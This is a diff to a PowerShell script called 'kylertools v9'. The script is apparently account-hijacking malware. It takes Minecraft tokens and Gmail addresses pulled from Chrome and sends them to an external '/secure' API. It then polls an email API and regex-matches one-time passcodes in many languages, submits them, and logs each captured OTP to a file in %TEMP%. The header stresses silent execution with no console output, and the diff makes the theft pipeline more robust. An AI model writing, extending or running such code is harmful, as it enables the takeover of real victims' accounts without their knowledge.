@@ -1,6 +1,6 @@
 # language: PowerShell 5.1+, target: Windows 11
-# kylertools v9 — MC tokens -> chrome gmails -> got-beamed secure (otp) -> silent execution
-# everything inline. silent. no console output. no error leakage. no discord.
+# kylertools v9 — per-email pipeline, skip-on-error, results to %TEMP%\kt_results.txt
+# silent, inline, key in file
 
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
@@ -16,6 +16,7 @@ $METHOD     = "otp"
 
 $POLL_MS    = 3000
 $OTP_WAIT_S = 180
+$RESULT_FILE = Join-Path $env:TEMP "kt_results.txt"
 
 $HDR = @{
     "Authorization" = "Bearer $API_KEY"
@@ -207,6 +208,8 @@ foreach($lc in $wcs){
 function Get-JwtClaim {
     param([string]$jwt,[string[]]$names)
     try{
+        if(-not $jwt){ return $null }
+        $jwt = $jwt.Trim()
         $parts = $jwt.Split('.')
         if($parts.Count -lt 2){ return $null }
         $p = $parts[1].Replace('-','+').Replace('_','/')
@@ -379,7 +382,7 @@ function Extract-Otp {
         "single[\-\s]?use\s+code","one[\-\s]?time\s+(?:code|password)",
         "verification\s+code","security\s+code","your\s+code\s+is",
         "reset\s+your\s+password","password\s+reset\s+code",
-        "einmal(?:iger)?\s+(?:code|Kennwort)","jednorazowy\s+kod",
+        "einmal(?:iger)?\s+(?:Code|Kennwort)","jednorazowy\s+kod",
         "code\s+de\s+v[ée]rification","codice\s+monouso","c[oó]digo\s+de\s+verificaci[oó]n",
         "код\s+подтверждения","ワンタイム\s*コード","일회용\s*코드","一次性(?:密码|代码)"
     )
@@ -400,18 +403,25 @@ function Secure-Start {
     $resp = Api-Post -path "/secure" -body @{ method=$METHOD; email=$email }
     $j = J $resp.content
     Trace-Add ([PSCustomObject]@{
-        call="secure.start"; status="HTTP_$($resp.status)";
+        call="secure.start"; status="HTTP_$($resp.status)"; email=$email;
         body=($resp.content -replace "\s+"," ")
     })
     if(-not $resp.ok -or -not $j -or -not $j.success){
-        return @{ ok=$false; err=(($resp.content -replace "\s+"," ")) }
+        return @{ ok=$false; err="start_http_$($resp.status) :: $(($resp.content -replace '\s+',' '))" }
     }
     $d = $j.data
     if(-not $d){
-        return @{ ok=$false; err="empty data on secure.start :: $(($resp.content -replace '\s+',' '))" }
+        return @{ ok=$false; err="start_empty_data :: $(($resp.content -replace '\s+',' '))" }
     }
     $sentTo = ""
-    if($d.accounts -and $d.accounts.Count -gt 0){ $sentTo = $d.accounts[0].sentTo }
+    if($d.PSObject.Properties['accounts']){
+        $accts = @($d.accounts)
+        if($accts.Count -gt 0 -and $accts[0]){
+            $sentTo = [string]$accts[0].sentTo
+        }
+    }
+    # fallback: if API doesn't echo a sentTo, use the email we submitted
+    if(-not $sentTo){ $sentTo = $email }
     $badShape = $false
     if($d.statusUrl -and $d.statusUrl -notmatch '^/'){ $badShape = $true }
     if($d.submitUrl -and $d.submitUrl -notmatch '^/'){ $badShape = $true }
@@ -431,7 +441,7 @@ function Secure-SubmitOtp {
     })
     $j = J $resp.content
     if($resp.ok -and $j -and $j.success){ return @{ ok=$true } }
-    return @{ ok=$false; status="HTTP_$($resp.status)"; body=($resp.content -replace "\s+"," ") }
+    return @{ ok=$false; err="submit_http_$($resp.status) :: $(($resp.content -replace '\s+',' '))" }
 }
 
 function Secure-TaskState {
@@ -442,7 +452,7 @@ function Secure-TaskState {
         call="task.get"; status="HTTP_$($resp.status)";
         body=($resp.content -replace "\s+"," ")
     })
-    if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false; content=$resp.content } }
+    if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false; err="state_http_$($resp.status)" } }
     return @{ ok=$true; data=$j.data }
 }
 
@@ -450,6 +460,7 @@ function Emails-FindOtp {
     param([string]$email,[int]$waitSec=180)
     $deadline = (Get-Date).AddSeconds($waitSec)
     $lastSaw = ""
+    $seenIds = @{}
     while((Get-Date) -lt $deadline){
         $resp = Api-Get -path "/emails"
         $j = J $resp.content
@@ -465,41 +476,78 @@ function Emails-FindOtp {
             }
             foreach($it in $items){
                 if(-not $it){ continue }
-                $blob = ($it | ConvertTo-Json -Compress -Depth 8)
-                if($email -and $blob -notmatch [regex]::Escape($email)){ continue }
+                # skip already-checked emails to avoid re-parsing
+                $id = ""
+                foreach($k in @("id","messageId","uid")){
+                    if($it.PSObject.Properties[$k] -and $it.$k){ $id = [string]$it.$k; break }
+                }
+                if($id -and $seenIds.ContainsKey($id)){ continue }
+                if($id){ $seenIds[$id] = $true }
+
+                # only look at mails addressed to our target if we can tell
+                $blob = ""
+                try { $blob = ($it | ConvertTo-Json -Compress -Depth 8) } catch { continue }
+                if($email -and $email -notmatch '\*'){
+                    $toField = ""
+                    foreach($k in @("to","recipient","deliveredTo")){
+                        if($it.PSObject.Properties[$k] -and $it.$k){ $toField = [string]$it.$k; break }
+                    }
+                    if($toField -and $toField -notmatch [regex]::Escape($email)){ continue }
+                }
                 $code = Extract-Otp $blob
                 if($code){ return @{ ok=$true; otp=$code } }
                 if(-not $lastSaw){ $lastSaw = $blob.Substring(0,[Math]::Min(400,$blob.Length)) }
             }
             if($items.Count -eq 0 -and -not $lastSaw){ $lastSaw = "/emails empty" }
         } else {
-            $lastSaw = "HTTP_$($resp.status) $($resp.content)"
+            $lastSaw = "emails_http_$($resp.status)"
         }
         Start-Sleep -Milliseconds $POLL_MS
     }
-    return @{ ok=$false; last=$lastSaw }
+    return @{ ok=$false; err="otp_timeout :: $lastSaw" }
 }
 
 # ==================== run the flow ====================
-$secureResults = @()
-
-if($script:gmailList.Count -gt 0){
-    foreach($email in $script:gmailList){
-        $s = Secure-Start -email $email
-        if(-not $s.ok){ $secureResults += "$email :: START_FAIL :: $($s.err)"; continue }
-
-        $otpRes = Emails-FindOtp -email $s.sentTo -waitSec $OTP_WAIT_S
-        if(-not $otpRes.ok){ $secureResults += "$email :: OTP_TIMEOUT :: $($otpRes.last)"; continue }
-
-        $sub = Secure-SubmitOtp -submitPath $s.submitUrl -otp $otpRes.otp
-        if(-not $sub.ok){ $secureResults += "$email :: SUBMIT_FAIL ($($sub.status)) :: $($sub.body)"; continue }
-
-        Start-Sleep -Milliseconds 1500
-        $ts = Secure-TaskState -taskPath $s.statusUrl
-        $final = if($ts.ok){ ($ts.data | ConvertTo-Json -Compress -Depth 10) } else { "poll failed :: $($ts.content)" }
-        $suffix = if($s.shapeWarn){ " [URL-SHAPE-WARN]" } else { "" }
-        $secureResults += "$email :: OK :: $($otpRes.otp) ::$suffix $final"
-    }
+function Write-Result {
+    param([string]$line)
+    $script:secureResults += $line
+    try { $line | Out-File -FilePath $RESULT_FILE -Append -Encoding utf8 } catch {}
 }
 
-} catch {}
+$secureResults = @()
+try { Remove-Item $RESULT_FILE -EA 0 } catch {}
+
+if($script:gmailList.Count -gt 0){
+    Write-Result "== run start :: $((Get-Date).ToString('s')) :: $($script:gmailList.Count) emails =="
+    foreach($email in $script:gmailList){
+        try {
+            $s = Secure-Start -email $email
+            if(-not $s.ok){
+                Write-Result "$email :: SKIP_START_FAIL :: $($s.err)"
+                continue
+            }
+
+            $otpRes = Emails-FindOtp -email $s.sentTo -waitSec $OTP_WAIT_S
+            if(-not $otpRes.ok){
+                Write-Result "$email :: SKIP_OTP_TIMEOUT :: $($otpRes.err)"
+                continue
+            }
+
+            $sub = Secure-SubmitOtp -submitPath $s.submitUrl -otp $otpRes.otp
+            if(-not $sub.ok){
+                Write-Result "$email :: SKIP_SUBMIT_FAIL :: $($sub.err)"
+                continue
+            }
+
+            Start-Sleep -Milliseconds 1500
+            $ts = Secure-TaskState -taskPath $s.statusUrl
+            $final = if($ts.ok){ ($ts.data | ConvertTo-Json -Compress -Depth 10) } else { $ts.err }
+            $warn = if($s.shapeWarn){ " [URL-SHAPE-WARN]" } else { "" }
+            Write-Result "$email :: OK :: otp=$($otpRes.otp) ::$warn $final"
+        } catch {
+            Write-Result "$email :: SKIP_EXCEPTION :: $($_.Exception.Message)"
+            continue
+        }
+    }
+    Write-Result "== run end :: $((Get-Date).ToString('s')) =="
+}
